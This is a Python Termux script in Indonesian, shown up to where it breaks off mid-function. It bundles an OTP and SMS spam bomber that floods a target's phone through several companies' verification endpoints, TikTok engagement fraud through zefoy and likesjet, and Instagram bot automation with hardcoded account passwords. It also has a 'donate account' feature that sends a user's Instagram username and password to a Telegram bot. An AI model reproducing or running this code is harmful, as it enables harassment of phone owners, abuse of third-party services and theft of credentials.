import os,requests,sys
try:
  response = requests.get("http://www.google.com", timeout=5)
  response.raise_for_status()
  print("Koneksi internet tersedia.")
  import requests,colorama,bs4,tabulate,git,prettytable
except requests.RequestException:
    print("Tidak dapat terhubung ke internet. Periksa koneksi Anda.")
    sys.exit(1)
except:
  os.system("pip install colorama")
  os.system("pip install bs4")
  os.system("pip install tabulate")
  os.system("pip install GitPython")
  os.system("pip install fake-useragent")
  os.system("pip install prettytable")
  os.system("pip install instagram_private_api")
import sys,re,time,requests,colorama,string,random,bs4,tabulate,git,threading,base64,ctypes,json,prettytable,secrets,instagram_private_api
from random import randint
from urllib.parse import urlencode
from concurrent.futures import thread
from ast import arg
from prettytable import PrettyTable
from datetime import datetime
from bs4 import BeautifulSoup
from instagram_private_api import Client, ClientCompatPatch
from tabulate import tabulate
from time import strftime
from colorama import Fore,init,Back
from fake_useragent import UserAgent
from urllib.parse import urlparse, unquote, quote
from string import ascii_letters, digits
os.system("cls" if os.name == "nt" else "clear")

global count
count = 0

ua = UserAgent()
freya = ua.random
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8"
    
]
zee = random.choice(user_agents)

api_rndm = [
    'evermos=requests.post("https://evermos.com/int-client/v3/user-verification/phone-registration", headers={"Host": "evermos.com", "content-length": "26", "origin": "https://evermos.com", "client-device": "web_mobile", "authorization": "Bearer 8e1254ac2c8e0783402ed1e47764940328a2d0f5", "x-forwarded-for": "10.0.84.135", "content-type": "application/json", "accept": "application/json, text/plain, */*", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3", "referer": "https://evermos.com/registration/otp?source_link=GAds_SEM_EV_EVMBrand", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}, data=json.dumps({"phone": "62"+no}))',
    'mokasm=requests.post("https://service.mokapos.com/account/v1/verification/phone/send", headers={"accept": "application/json, text/plain, */*", "authorization": "undefined", "save-data": "on", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3", "content-type": "application/json;charset=UTF-8"}, data=json.dumps({"phone_number": f"+62"+no})).text',
    'bantudagang=requests.post("https://app.bantudagang.com/api/auth/request-otp", headers = {"Host": "app.bantudagang.com","Content-Length": "55","Origin": "https://app.bantudagang.com","Authorization": "Bearer","Access-Control-Max-Age": "86400","Content-Type": "application/json","Accept": "application/json, text/plain, */*","Cache-Control": "no-cache","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3","Referer": "https://app.bantudagang.com/register","Accept-Encoding": "gzip, deflate, br","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","Cookie": "_fbp=fb.1.1713015792899.82897756; _gcl_au=1.1.764924446.1713015794; _ga_HSV4N9N8GW=GS1.1.1713015797.1.1.1713015802.0.0.0; _ga=GA1.2.59243435.1713015797; _gid=GA1.2.515919540.1713015804; _gat_gtag_UA_194308569_1=1",}, data =json.dumps({"phone_number": "62"+no,"from": "registration",}))',
    'dekorsm=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":"+62"+no,"platform":"sms"})).text'
]
adel = random.choice(api_rndm)

bot_accounts = [
    {'username': 'billa.cans43', 'password': 'bwfREdjE&4T%'},
    {'username': 'annisach37', 'password': 'w#~TWv*Gt&$y'},
    {'username': 'salsa.cans32', 'password': 'rN@T(f6@$BX'},
]

P = '\x1b[1;97m'  # PUTIH
M = '\x1b[1;91m'  # MERAH
R = '\x1b[1;91m'
Y = '\x1b[1;93m'
Ab = '\x1b[1;30m'
H = '\x1b[1;92m'  # HIJAU
K = '\x1b[1;93m'  # KUNING
B = '\x1b[1;94m'  # BIRU	
U = '\x1b[1;95m'  # UNGU
O = '\x1b[1;96m'  # BIRU MUDA
N = '\x1b[0m'     # WARNA nTerminating
numbers = []
Freya = [M, H, K, B, U, O,]
warna = random.choice(Freya)

prev_user = None
prev_link = None

## perkenalan ##
def get_nama():
    try:
        with open('id.json', 'r') as file:
            data = json.load(file)
            return data['nama']
    except FileNotFoundError:
        return None

def simpan_nama(nama):
    data = {'nama': nama}
    with open('id.json', 'w') as file:
        json.dump(data, file)

def waktu_hari_ini():
    now = datetime.now()
    jam = now.hour
    if jam < 12:
        return "pagi"
    elif jam < 18:
        return "siang"
    elif jam < 20:
        return "sore"
    else:
        return "malam"

def print_nama():
    nama = get_nama()
    if nama is not None:
        waktu = waktu_hari_ini()
        print(f"Hallo {R}: {H}{nama}{N} ")
        print(f"Selamat {waktu} ")
        print("fitur ini masih dalam tahap pengembangan.")
    else:
        print("Data tidak ditemukan.")

# zefoy #
class Zefoy:
    def __init__(self):
        self.base_url = 'https://zefoy.com/'
        self.headers = {'user-agent': zee}
        self.session = requests.Session()
        self.captcha_1 = None
        self.captcha_ = {}
        self.service = 'Favorites'
        self.video_key = None
        self.services = {}
        self.services_ids = {}
        self.services_status = {}
        self.url = 'None'
        self.text = 'VIEWTIKTOK'
        url1=input("Link Vt Disini Ya : ")
        self.url=url1

    def get_captcha(self):
        if os.path.exists('session'): self.session.cookies.set("PHPSESSID", open('session',encoding='utf-8').read(), domain='zefoy.com')
        request = self.session.get(self.base_url, headers=self.headers)
        if 'Enter Video URL' in request.text: self.video_key = request.text.split('" placeholder="Enter Video URL"')[0].split('name="')[-1]; return True

        try:
            for x in re.findall(r'<input type="hidden" name="(.*)" value="(.*)">', request.text): self.captcha_[x[0]] = x[1]

            self.captcha_1 = request.text.split('type="text" name="')[1].split('" oninput="this.value=this.value.toLowerCase()"')[0]
            captcha_url = request.text.split('<img src="')[1].split('" onerror="imgOnError()" class="')[0]
            request = self.session.get(f"{self.base_url}{captcha_url}",headers=self.headers)
            open('captcha.png', 'wb').write(request.content)
            print('wait capcha..')
            return False
        except Exception as e:
            print(f"error captcha: {e}")
            time.sleep(2)
            self.get_captcha()

    def send_captcha(self, new_session = False):
        if new_session: self.session = requests.Session(); os.remove('session'); time.sleep(2)
        if self.get_captcha(): print('Sukses untuk session');return (True, 'session kamu keluar')
        captcha_solve = self.solve_captcha('captcha.png')[1]
        self.captcha_[self.captcha_1] = captcha_solve
        request = self.session.post(self.base_url, headers=self.headers, data=self.captcha_)

        if 'Enter Video URL' in request.text: 
            print('Session ditemukan.')
            open('session','w',encoding='utf-8').write(self.session.cookies.get('PHPSESSID'))
            print(f"Capcha menunjukan: {captcha_solve}")
            self.video_key = request.text.split('" placeholder="Enter Video URL"')[0].split('name="')[-1]
            return (True,captcha_solve)
        else: return (False,captcha_solve)

    def solve_captcha(self, path_to_file = None, b64 = None, delete_tag = ['\n','\r']):
        if path_to_file: task = path_to_file
        else: open('temp.png','wb').write(base64.b64decode(b64)); task = 'temp.png'
        request = self.session.post('https://api.ocr.space/parse/image?K87899142388957', headers={'apikey':'K87899142388957'}, files={'task':open(task,'rb')}).json()
        solved_text = request['ParsedResults'][0]['ParsedText']
        for x in delete_tag: solved_text = solved_text.replace(x,'')
        return (True, solved_text)

    def get_status_services(self):
        request = self.session.get(self.base_url, headers=self.headers).text
        for x in re.findall(r'<h5 class="card-title">.+</h5>\n.+\n.+', request): self.services[x.split('<h5 class="card-title">')[1].split('<')[0].strip()] = x.split('d-sm-inline-block">')[1].split('</small>')[0].strip()
        for x in re.findall(r'<h5 class="card-title mb-3">.+</h5>\n<form action=".+">', request): self.services_ids[x.split('title mb-3">')[1].split('<')[0].strip()] = x.split('<form action="')[1].split('">')[0].strip()
        for x in re.findall(r'<h5 class="card-title">.+</h5>\n.+<button .+', request): self.services_status[x.split('<h5 class="card-title">')[1].split('<')[0].strip()] = False if 'disabled class' in x else True
        return (self.services, self.services_status)

    def get_table(self, i = 1):
        table = PrettyTable(field_names=["ID", "Pilihan", "Status"], title="Status Services", header_style="upper",border=True)
        while True:
            if len(self.get_status_services()[0])>1:break
            else:print('Blm Mendapatkan Capcha, ulang...');self.send_captcha();time.sleep(2)
        for service in self.services:
            table.add_row([f"{Fore.CYAN}{i}{Fore.RESET}", service, f"{Fore.GREEN if 'ago updated' in self.services[service] else Fore.RED}{self.services[service]}{Fore.RESET}"])
            i += 1
        table.title = f"{Fore.YELLOW}Layanan Yang Beroprasi: {len([x for x in self.services_status if self.services_status[x]])}{Fore.RESET}"
        

    def find_video(self):
        if self.service is None: return (False, "You didn't choose the service")
        while True:
            if self.service not in self.services_ids: self.get_status_services(); time.sleep(1)
            request = self.session.post(f'{self.base_url}{self.services_ids[self.service]}', headers={'content-type':'multipart/form-data; boundary=----WebKitFormBoundary0nU8PjANC8BhQgjZ', 'user-agent':self.headers['user-agent'], 'origin':'https://zefoy.com'}, data=f'------WebKitFormBoundary0nU8PjANC8BhQgjZ\r\nContent-Disposition: form-data; name="{self.video_key}"\r\n\r\n{self.url}\r\n------WebKitFormBoundary0nU8PjANC8BhQgjZ--\r\n')
            try: self.video_info = base64.b64decode(unquote(request.text.encode()[::-1])).decode()
            except: time.sleep(3); continue
            if 'Session expired. Please re-login' in self.video_info:
                print('Phiên hết hạn. Đang đăng nhập lại...')
                self.send_captcha()
                return
            elif 'service is currently not working' in self.video_info:
                return (True, 'Dịch vụ hiện không hoạt động, hãy thử lại sau.')
            elif """onsubmit="showHideElements""" in self.video_info:
                self.video_info = [self.video_info.split('" name="')[1].split('"')[0],self.video_info.split('value="')[1].split('"')[0]]
                return (True, request.text)
            elif 'Checking Timer...' in self.video_info:
                try: 
                    t=int(re.findall(r'ltm=(\d*);', self.video_info)[0])
                    zyfoy = int(re.findall(r'ltm=(\d*);', self.video_info)[0])
                except: 
                    return (False,)
                if zyfoy==0:self.find_video()
                elif zyfoy >= 1000:
                    print('IP ĐÃ BỊ CHẶN')
                _=time.time()
                while time.time()-2<_+zyfoy:
                    t-=1
                    print('                                                   ', end = '\r')
                    print(f"Vui lòng chờ: {0} ".format(t)+"giây .....", end="\r")
                    print('                                                   ', end = '\r')
                    time.sleep(1)
                continue
            elif 'Too many requests. Please slow' in self.video_info:
                time.sleep(3)
            else:
                print(self.video_info)

    def use_service(self):
        if self.find_video()[0] is False:
            return False
        self.token = "".join(random.choices(ascii_letters+digits, k=16))
        request = self.session.post(f'{self.base_url}{self.services_ids[self.service]}', headers={'content-type':f'multipart/form-data; boundary=----WebKitFormBoundary{self.token}', 'user-agent':self.headers['user-agent'], 'origin':'https://zefoy.com'}, data=f'------WebKitFormBoundary{self.token}\r\nContent-Disposition: form-data; name="{self.video_info[0]}"\r\n\r\n{self.video_info[1]}\r\n------WebKitFormBoundary{self.token}--\r\n')
        try:
            res = base64.b64decode(unquote(request.text.encode()[::-1])).decode()
        except:
            time.sleep(3)
            return ""
        if 'Session expired. Please re-login' in res:
            print('Phiên hết hạn. Đang đăng nhập lại...')
            self.send_captcha()
            return ""
        elif 'Too many requests. Please slow' in res:
            time.sleep(3)
        elif 'service is currently not working' in res:
            return ('Dịch vụ hiện không hoạt động, hãy thử lại sau.')
        else:
            print(res.split("sans-serif;text-align:center;color:green;'>")[1].split("</")[0])

    def get_video_info(self):
        request = self.session.get(f'https://tiktok.livecounts.io/video/stats/{urlparse(self.url).path.rpartition("/")[2]}',headers={'authority':'tiktok.livecounts.io','origin':'https://livecounts.io','user-agent':self.headers['user-agent']}).json()
        if 'viewCount' in request:
            return request
        else:
            return {'viewCount':0, 'likeCount':0,'commentCount':0,'shareCount':0}

    def get_video_id(self, url_ = None, set_url=True):
        if url_ is None:
            url_ = self.url
        if url_[-1] == '/':
            url_ = url_[:-1]
        url = urlparse(url_).path.rpartition('/')[2]
        if url.isdigit():
            self.url = url_
            return url_
        request = requests.get(f'https://api.tokcount.com/?type=videoID&username=https://vm.tiktok.com/{url}',headers={'origin': 'https://tokcount.com','authority': 'api.tokcount.com','user-agent': zee})
        if request.text == '':
            print('Link video không hợp lệ')
            return False
        else:
            json_ = request.json()
        if 'author' not in json_:
            print(f'{self.url}| Link video không hợp lệ')
            return False
        if set_url:
            self.url = f'https://www.tiktok.com/@{json_["author"]}/video/{json_["id"]}'
            print(f'Formated video url --> {self.url}')
        return request.text

    def check_config(self):
        while True:
            try: 
                last_url = self.url
                if last_url != self.url:
                    self.get_video_id()
            except Exception as e:
                print(e)
            time.sleep(4)

    def update_name(self):
        while True:
            try:
                ctypes.windll.kernel32.SetConsoleTitleA(self.text.encode())
                video_info = self.get_video_info()
                self.text = f"Views: {video_info['viewCount']} "
            except:
                pass
            time.sleep(5)

    def select_service(self):
        while True:
            trang = "\033[1;37m"
            xanh_la = "\033[1;32m"
            xanh_duong = "\033[1;34m"
            do = "\033[1;31m"
            vang = "\033[1;33m"
            tim = "\033[1;35m"

            self.get_table()
            print(f"{xanh_la}Pilih Ya Mas:", end=' ')
            service_id = input()
            if service_id.isdigit():
                service_id = int(service_id)
                if service_id in range(1, len(self.services) + 1):
                    services_list = list(self.services.keys())
                    self.service = services_list[service_id - 1]
                    break
                else:
                    print(f"{do}Yang Bener Aja Inputnya Mas.")
            else:
                print(f"{do}Yang Bener Aja Inputnya Mas.")

    def run(self):
        self.select_service()
        while True:
            trang = "\033[1;37m"
            xanh_la = "\033[1;32m"
            xanh_duong = "\033[1;34m"
            do = "\033[1;31m"
            vang = "\033[1;33m"
            tim = "\033[1;35m"
            try:
                if 'Service is currently not working, try again later' in str(self.use_service()):
                    print(f'{do}[\033[1;33mDịch vụ hiện không hoạt động, hãy thử lại sau.')
                    time.sleep(5)
            except Exception as e:
                print(f'errorInfo : {e}')
                time.sleep(10)
# clear zefoy #

# likesjet #
def likesjet():
    global prev_user, prev_link
    
    if prev_user is None:
        user = input(f"[{warna}+{N}] TikTok UserName : ")
        prev_user = user
    else:
        user = prev_user

    if prev_link is None:
        link = input(f"[{warna}+{N}] Video Link : ")
        prev_link = link
    else:
        link = prev_link
    
    email = f"whisper{random.randint(100000,999999)}@gmail.com"
    headers = {
        "Host": "api.likesjet.com",
        "content-length": "137",
        "sec-ch-ua": "\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": zee,
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://likesjet.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://likesjet.com/",
        "accept-language": "en-XA,en;q=0.9,ar-XB;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5"
    }
    data = {
        "link": link,
        "tiktok_username": user,
        "email": email
    }
    res = requests.post('https://api.likesjet.com/freeboost/3', json=data, headers=headers).json()
    if res.get('status'):
        print('Request successful:')
        print(res.get('message'))
    else:
        print('Request failed:')
        print(res.get('message'))
        if "active order" in res.get('message').lower():
            print("Waiting for the previous order to complete...")
            time.sleep(300)  # Tunggu 5 menit sebelum menjalankan permintaan lagi
            likesjet()
# Clear likesjet #

# Fungsi Ig #
def follow_user(target_username):
    try:
        for bot_account in bot_accounts:
            time.sleep(random.uniform(30, 120))
            api = Client(bot_account['username'], bot_account['password'])
            api.login()

            user_id = api.username_info(target_username)["user"]["pk"]
            api.friendships_create(user_id)
            return True, f"Berhasil mengikuti {target_username} bot {bot_account['username']}!"

            time.sleep(random.uniform(60, 240))
            api.logout()
            print(f"Akun {bot_account['username']} logout.")
    except Exception as e:
        return False, f"Bot {bot_account['username']}: Gagal mengikuti {target_username}: {e}"

def like_latest_post(api, user_id):
    try:
        # Mendapatkan posting terbaru dari pengguna target
        user_feed = api.user_feed(user_id)
        if user_feed.get('items'):
            latest_post = user_feed['items'][0]
            latest_post_id = latest_post['id']

            # Menyukai posting terbaru dari pengguna target
            api.post_like(latest_post_id)
            print(f"Mensukai posting terbaru.")
    except Exception as e:
        print(f"Gagal menyukai posting terbaru: {e}")

def comment_latest_post(api, user_id):
    try:
        # Mendapatkan posting terbaru dari pengguna target
        user_feed = api.user_feed(user_id)
        if user_feed.get('items'):
            latest_post = user_feed['items'][0]
            latest_post_id = latest_post['id']

            # Menentukan jenis media postingan
            if latest_post['media_type'] == 2:
                comment_text = "Ide Bagus..."
            else:
                comment_text = "keren"

            # Mengomentari posting terbaru dari pengguna target
            api.post_comment(latest_post_id, comment_text)
            print(f"Mengomentari posting terbaru.")
    except Exception as e:
        print(f"Gagal mengomentari posting terbaru: {e}")

def like_and_comment(target_username, bot_account):
    try:
        api = Client(bot_account['username'], bot_account['password'])
        api.login()

        user_id = api.username_info(target_username)["user"]["pk"]

        # Menyukai posting terbaru pengguna target
        like_latest_post(api, user_id)

        # Mengomentari posting terbaru pengguna target
        comment_latest_post(api, user_id)

        # Logout dari akun
        api.logout()
        print(f"Akun {bot_account['username']} logout.")
    except Exception as e:
        print(f"Gagal berinteraksi dengan @{target_username} menggunakan bot {bot_account['username']}: {e}")

def check_login_and_send(username, password, bot_token, chat_id):
    try:
        api = Client(username, password)
        user_id = api.authenticated_user_id
        message = f"Berhasil login. Username: {username}, Password: {password}"
        return send_telegram_message(bot_token, chat_id, message)
    except Exception as e:
        return "Gagal login. Silakan periksa kembali username dan password Anda."
# Clear Log #

# Rest Telegram Send Message #
def send_telegram_message(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message
    }
    response = requests.post(url, json=data)
    if response.status_code != 200:
        return "Sepertinya Sedang Terjadi Masalah Ayo Coba Ulangi."
    return "Terimakasih Atas Sumbangan Anda."
# Clear Rest #

git_dir = os.getcwd()
g = git.cmd.Git(git_dir)
g.pull()  

flag_file_path = "dct.txt"
url = "https://www.youtube.com/@Dikz87"

if not os.path.exists(flag_file_path):
    os.system(f"termux-open-url {url}")
    os.system("clear")
    os.system('rm -r dctsolid.txt')
    with open(flag_file_path, "w") as flag_file:
        flag_file.write("Pertanyaan Akan Di Jawab Melalui Dm wa 08388275971")

def autoketik(s):
    for c in s :
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.005) 


# LOGO NIHH BANH 
def caramel_freya():
  autoketik(f"""
{U}╔╗ {N}╦  ╦   {Y}•{P} Creator{M} :{P}  𝐃𝐈𝙕𝙓 𝐌𝐀𝐑𝐊𝐄𝐓{P}
{U}╠╩╗{N}╚╗╔╝   {Y}•{N} Github{M}  :{B}  https://github.com/Dikz47{P}
{U}╚═╝{N} ╚╝{Y} @{H}3{Y} •{N} Youtube{M} :{P}  Dikz87{P}
""")

def caramel_freya_2():
  autoketik(f"""
{U}╔╦╗{N}┌┬┐{Y}•{P} Creator{M} :{P} 𝐃𝐈𝙕𝙓 𝐌𝐀𝐑𝐊𝐄𝐓 {P}
{U} ║ {N} │ {Y}•{N} Github{M}  :{B}  https://github.com/Dikz47{P}
{U} ╩ {N} ┴ {Y}•{N} Youtube{M} :{P}  Dikz87{P}
""")

def caramel_freya_3():
  autoketik(f"""
{U} ___{N} ___{Y}  •{P} Creator{M} :{P}  DII X Vindra ID X 𝐃𝐈𝙕𝙓{P}
{U}/ __|{N} _ ){Y} •{N} Github{M}  :{B}  github.com/oranginisiald{P}
{U}\__ \{N} _ \{Y} •{N} Youtube{M} :{P}  DII37{P}
{U}|___/{N}___/
""")

def caramel_freya_4():
  autoketik(f"""
{U}╔╦╗{N}┳┓{Y}•{P} Creator{M} :{P}  DII X 𝐃𝐈𝙕𝙓{P}
{U} ║ {N}┣┫{Y}•{N} Github{M}  :{B}  github.com/oranginisiald{P}
{U} ╩ {N}┻┛{Y}•{N} Youtube{M} :{P}  DII37{P}
""")

def mediilolz():
  autoketik(f"""
{U}{N}___{Y} •{P} Creator{M} :{P}  DII X 𝐃𝐈𝙕𝙓{P}
{U}|{N}|{Y}  •{N} Github{M}  :{B}  github.com/oranginisiald{P}
{U}|{N}|{Y}  •{N} Youtube{M} :{P}  DII37{P}
""")
# PENUTUP LOGO


def dino_zee(): #Menu Awal
    try:
        print_nama()
        print(f"\n {P}1{M}.{P} Main Menu\n {P}2{M}.{P} Dukung Author\n {P}3{M}.{P} Whatsapp Group\n {P}0{M}.{P} Keluar")
        suer = input(f'\n{P}[{U}!{P}] Pilih Disini Ya Mas{M} :{H} ')
        if suer == "1":
            os.system("clear");caramel_freya();main_menu()
        elif suer == "2":
            os.system("clear");caramel_freya();auth_list()
        elif suer == "3":
            os.system("clear");caramel_freya();info_in()
        elif suer == "0":
            os.system("exit")
    except KeyboardInterrupt:
        sys.exit("\nTerminating the script.")

def main_menu(): #Menu Inti
    try:
        print(f"\n {P}1{M}.{P} Spam Tools\n {P}2{M}.{P} TikTok Tools\n {P}3{M}.{P} Instagram Tools ( Tahap Pengembangan )\n {P}4{M}.{P} Spam Bot Telegram\n {P}5{M}.{P} Refurbis Script Spam\n {P}0{M}.{P} Kembali")
        suer = input(f'\n{P}[{U}!{P}] Pilih Disini Ya Mas{M} :{H} ')
        if suer == "1":
            os.system("clear");caramel_freya_3();spam_menu()
        elif suer == "2":
            os.system("clear");caramel_freya_2();main_menu_tt()
        elif suer == "3":
            os.system("clear");mediilolz();main_menu_ig()
        elif suer == "4":
            os.system("clear");caramel_freya_4();trashbot()
        elif suer == "5":
            os.system("clear");caramel_freya();akus()
        elif suer == "0":
            os.system("clear");caramel_freya();dino_zee()
    except KeyboardInterrupt:
        sys.exit("\nTerminating the script.")

def main_menu_tt(): #Menu Awal tt
    try:
        print(f"\n {P}1{M}.{P} Tiktok Tools\n {P}0{M}.{P} Kembali")
        suer = input(f'\n{P}[{U}!{P}] Pilih Disini Ya Mas{M} :{H} ')
        if suer == "1":
            os.system("clear");caramel_freya_2();tiktok()
        elif suer == "2":
            os.system("clear");caramel_freya_2();auth_list()
        elif suer == "0":
            os.system("clear");caramel_freya();main_menu()
    except KeyboardInterrupt:
        sys.exit("\nTerminating the script.")

def main_menu_ig():
    try:
        #print("Jumlah akun tumbal tersedia:", len(bot_accounts))
        print("Jumlah akun tumbal tersedia: 0")
        print(f"\n {P}1{M}.{P} Sumbang Akun Tumbal\n {P}2{M}.{P} Follow Akun Ig\n {P}3{M}.{P} Like & Komentar Postingan/reels Terbaru\n {P}0{M}.{P} Kembali")
        suer = input(f'\n{P}[{U}!{P}] Pilih Disini Ya Mas{M} :{H} ')
        if suer == "1":
            os.system("clear");mediilolz();logdii()
        elif suer == "2":
            os.system("clear");mediilolz();haimedii()
        elif suer == "3":
            os.system("clear");mediilolz();diilico()
        elif suer == "0":
            os.system("clear");caramel_freya();main_menu()
    except KeyboardInterrupt:
        sys.exit("\nTerminating the script.")

def auth_list(): #Yang Ganti Pasti Copas
	try:
		print(f"\n {P}1{M}.{P} Dukung oranginisiald\n {P}2{M}.{P} Follow Ig Vindra ID\n {P}3{M}.{P} Follow Ig Dell Store CPM\n {P}0{M}.{P} Kembali")
		suer = input(f'\n{P}[{U}!{P}] Dukungan Biar Semangat{M} :{H} ')
		if suer == "1":
			os.system("termux-open-url https://trakteer.id/diipay")
		elif suer == "2":
			os.system("termux-open-url https://instagram.com/vindradoang")
		elif suer == "3":
		  os.system("termux-open-url https://instagram.com/dellstorecpm")
		elif suer == "0":
		  os.system("clear");caramel_freya();dino_zee()
	except KeyboardInterrupt:
		sys.exit("\nTerminating the script.")

def auth_list_tt(): #Yang Ganti Pasti Copas
	try:
		print(f"\n {P}1{M}.{P} Dukung oranginisiald\n {P}2{M}.{P} Follow Ig Dell Store CPM\n {P}0{M}.{P} Kembali")
		suer = input(f'\n{P}[{U}!{P}] Dukungan Biar Semangat{M} :{H} ')
		if suer == "1":
			os.system("termux-open-url https://trakteer.id/diipay")
		elif suer == "2":
			os.system("termux-open-url https://www.instagram.com/dellstorecpm")
		elif suer == "0":
		  os.system("clear");caramel_freya_2();main_menu_tt()
	except KeyboardInterrupt:
		sys.exit("\nTerminating the script.")

def kfc():
	pil = input(f'{N}Ingin Linknya??? (y/n) ')
	if pil == "y":
		autoketik("https://chat.whatsapp.com/DVGIu889l7jFB5zZqvIEMp")
		print()
	elif pil == "n":
	  os.system("clear");caramel_freya();dino_zee()

def info_in():
  print()
  print(f"{N}[{warna}!{N}] Whatsapp Group Ini Bersifat Public  {N}[{warna}!{N}]")
  kfc()

def info_in_tt():
  print()
  print(f"{N}[{warna}!{N}] Whatsapp Group Ini Bersifat Public  {N}[{warna}!{N}]")
  kfc_tt()

def spam_menu():
    try:
        print(f"\n {P}1{M}.{P} Spam Call,Sms,Whatsapp ( MC{R} : {H}Call {N})\n {P}2{M}.{P} Spam Satuan\n {P}0{M}.{P} Kembali")
        suer = input(f'\n{P}[{U}!{P}] Pilih Disini Ya Mas{M} :{H} ')
        if suer == "1":
            os.system("clear");caramel_freya_3();fredi()
        elif suer == "2":
            os.system("clear");caramel_freya_3();menu_satuan()
        elif suer == "0":
            os.system("clear");caramel_freya();main_menu()
    except KeyboardInterrupt:
        sys.exit("\nTerminating the script.")

def fredi():
    try:
        number = input(f"\n{N}[{warna}?{N}] Nomor {Y}({Ab}Exam:8xxx{Y})={R}⟩{H} ")
        if number == "83809192307" or number == "882005602526" or number == "85953890866" or number == "" or number == "89531319589" or number == "85221850807":
            print(f'\n{M}tidak dapat Melakukan Spam ke PI')
            time.sleep(4)
        else:
            number_list = number.split(" ")
            for nomor in number_list:
                while True:
                  #pos=requests.post("https://api.dagangan.com/v2/users/sms", headers = {"Host": "api.dagangan.com", "accept": "application/json", "content-type": "application/json", "content-length": "50", "accept-encoding": "gzip", "user-agent": freya, "x-newrelic-id": "Vg8AVlRVDhAIUVFVAAEGX10="}, json = {"phone": f"0{number}", "otp_method": "missedcall"}).text
                  namk = random.choice(["Jamal","Ammr","Pardi","Xenzi","Vindra","Saipul","Farhan"])
                  mailk = random.choice(["jamal321@gmail.com","vindraid@gmail.com","ammar230@gmail.com","santrip109@gmail.com"])
                  head7={'Host': 'order.kfcku.com','content-length': '137','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"','accept': 'application/json, text/plain, */*','content-type': 'application/json','culturecode': 'id','sec-ch-ua-mobile': '?1','user-agent': freya,'sec-ch-ua-platform': '"Linux"','origin': 'https://order.kfcku.co','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://order.kfcku.com/account/register','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5,es;q=0.4'}
                  cokf={'cookie': '_ga=GA1.1.2145612061.1704219246','cookie': 'G_ENABLED_IDPS=google','cookie': '_ga_VDQKXM3LBX=GS1.1.1704219245.1.1.1704219399.0.0.0'}
                  data=json.dumps({"Phone":"+0"+number,"Email":mailk,"BirthDate":331603200,"FullName":namk,"Gender":"M","Password":"zNGqur8xRDSnSm2"})
                  pos=requests.post("https://order.kfcku.com/api/register",headers=head7,cookies=cokf,data=data).text
                  head8={'Host': 'order.kfcku.com','content-length': '70','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"','accept': 'application/json, text/plain, */*','content-type': 'application/json','culturecode': 'id','sec-ch-ua-mobile': '?1','user-agent': freya,'sec-ch-ua-platform': '"Android"','origin': 'https://order.kfcku.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://order.kfcku.com/account/register','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5,es;q=0.4'}
                  cokf2={'cookie': '_ga=GA1.1.2145612061.1704219246','cookie': 'G_ENABLED_IDPS=google','cookie': '_ga_VDQKXM3LBX=GS1.1.1704219245.1.1.1704219399.0.0.0'}
                  data2=json.dumps({"PhoneNumber":"+0"+number,"source":"register","token":"whatsapp"})
                  pos2=requests.post("https://order.kfcku.com/api/requestotp",headers=head8,cookies=cokf2,data=data2).text
                  xsrf = requests.get("https://magneto.api.halodoc.com/api/v1/users/status").cookies.get_dict()
